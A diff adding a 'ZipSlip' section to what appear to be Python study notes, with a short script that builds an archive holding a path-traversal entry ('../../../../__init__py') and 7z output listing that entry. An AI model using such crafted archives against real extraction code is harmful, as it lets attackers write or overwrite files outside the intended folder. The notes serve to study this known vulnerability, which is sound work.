@@ -5,6 +5,30 @@ description: Introduction Python programming language
 
 # Introduction
 
+## ZipSlip
+
+```python
+import zipfile
+
+zf = zipfile.ZipFile("evil.zip", "w")
+zf.writestr(zipfile.ZipInfo(r"commands/command.txt"), "echo 'Hello World!'")
+zf.writestr(zipfile.ZipInfo(r"../../../../__init__py"), "content")
+zf.close()
+```
+
+Result:
+
+```bash
+$ 7z l evil.zip
+[...]
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+1980-01-01 00:00:00 .....           19           19  commands/command.txt
+1980-01-01 00:00:00 .....            7            7  ../../../../__init__py
+------------------- ----- ------------ ------------  ------------------------
+1980-01-01 00:00:00                 26           26  2 files
+```
+
 ## Cmdloop
 
 Source code :
